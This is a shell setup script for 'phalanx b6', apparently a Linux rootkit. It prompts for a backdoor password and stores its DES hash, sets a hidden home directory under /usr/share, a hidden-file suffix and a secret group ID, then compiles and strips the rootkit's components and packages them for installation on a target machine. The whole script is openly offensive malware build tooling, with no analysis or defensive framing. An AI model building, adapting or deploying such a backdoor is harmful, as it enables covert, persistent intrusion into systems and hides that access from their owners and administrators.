#!/bin/sh

echo phalanx b6 setup / rebel nov 05
echo
echo -n "Enter a 2-letter salt: "
read salt
hm=`echo $salt|wc -c`
if [ $hm -le 2 ] || [ $hm -gt 3 ]
then
echo "Err..setting salt to \"ph\""
salt="ph"
fi
echo -n "Enter a password for ze backdoor: "
stty -echo
read passw
stty echo
echo "#define SALT \"$salt\"" > conf.h
hash=`echo -n $passw|mkpasswd -S $salt -H des -s`
echo "#define PASSWORD \"$hash\"" >> conf.h
echo
echo -n "Enter suffix for hidden files [.ph1]: "
read suffix
hm=`echo $suffix|wc -c`
if [ $hm -le 4 ] || [ $hm -gt 5 ]
then
echo Defaulting to \".ph1\"..
suffix=".ph1"
fi
echo -n "Enter secret hakurGID [41705]: "
read hakurgid
hm=`echo $hakurgid|wc -c`
if [ $hm -le 2 ]
then
echo -n Defaulting to 41705..
hakurgid="41705"
fi

cat >> conf.h <<_EOF_
#define HAXORGID $hakurgid
#define HOMEDIR "/usr/share/.home$suffix"
#define SUFFIX "$suffix"
#define PHALANX "/usr/share/.home$suffix/phalanx"
_EOF_
cat install.sh.template |sed -e "s/.ph1/$suffix/g" > ph/install.sh
echo Compiling..
gcc cb.c -o ph/cb -lutil
gcc client.c -o client -lcrypt
gcc kebab.c -o ph/kebab
gcc phalanx.c -o ph/phalanx &>/dev/null
strip ph/cb
strip ph/phalanx
strip ph/kebab
tar -cf ph.tar ph
gzip -f ph.tar
mv ph.tar.gz ph.tgz
du -h ph.tgz
echo 'w000p!1 setup done. copy ph.tgz to your lab-computer<tm>, extract it, and run install.sh.'
